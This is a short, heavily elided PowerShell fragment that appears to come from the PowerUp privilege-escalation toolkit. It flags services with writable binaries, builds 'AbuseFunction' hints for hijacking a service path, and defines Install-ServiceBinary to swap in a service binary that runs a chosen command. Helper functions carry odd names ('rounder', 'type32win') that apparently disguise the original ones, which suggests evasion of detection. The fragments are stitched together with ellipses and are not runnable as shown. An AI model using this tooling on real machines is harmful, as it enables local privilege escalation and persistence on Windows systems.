    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                ...
                $Out | Add-Member Noteproperty 'AbuseFunction' "rounder -Name '$($Service.name)' -Path <HijackPath>"
...
function Install-ServiceBinary {
    ...
    PROCESS {
        ...
        $Result = rounder -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
...
$Types = $FunctionDefinitions | type32win -Module $Module -Namespace 'PowerUp.NativeMethods'
